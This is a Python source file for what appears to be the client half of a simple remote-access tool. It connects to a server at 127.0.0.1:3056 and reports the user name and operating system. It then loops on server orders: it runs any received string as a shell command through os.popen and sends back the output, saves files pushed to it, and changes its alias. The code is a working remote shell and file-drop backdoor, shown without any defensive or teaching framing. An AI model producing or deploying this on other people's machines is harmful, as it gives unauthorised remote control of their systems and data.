import socket
from getpass import getuser
import os
import platform

class Client:
    def __init__(self):
        self.ADDR = ('127.0.0.1', 3056)
        self.SIZE = 1024

        self.INFO = 'info.ns'
        self._socket = socket.socket()
        self.open_socket()
        self.info_init()

        self.receive_loop()


    def open_socket(self):
        self._socket.connect(self.ADDR)
        


    def info_init(self):
        if not os.path.isfile(self.INFO):
            self.info_setting(str(getuser()))
        with open(self.INFO, 'r') as f:
            a = f.readlines()[0].replace('\n','')
            print(a)
            self._socket.sendall(a.encode())


    def info_setting(self, alias):
        with open(self.INFO, 'w') as f:
            f.write(alias + '\n')
            f.write(str(getuser()) + '\n')
            f.write(str(platform.system()) + '\n')
        

    def transfer(self):
        typ = self._socket.recv(self.SIZE).decode()
        print(typ)

        if typ == 'command':
            self._socket.sendall('Ready'.encode())
            recv = self._socket.recv(self.SIZE).decode()
            res = os.popen(recv).read()
            if res == '':
                res = 'No Result'
            self._socket.sendall(res.encode())

        elif typ == 'file send':
            self._socket.sendall('Ready'.encode())
            with open('recvFILE', 'wb') as f:
                while True:
                    _buff = self._socket.recv(self.SIZE)
                    if _buff == b'99':
                        print('end')
                        break
                    else:
                        f.write(_buff)
                        self._socket.sendall('ok'.encode())

        elif typ == 'set alias':
            self._socket.sendall('Ready'.encode())
            self.info_setting(self._socket.recv(self.SIZE).decode())

        else:
            self._socket.sendall('Undefined command'.encode())


    def receive_loop(self):
        while True:
            self.transfer()


if __name__ == '__main__':
    
    c = Client()
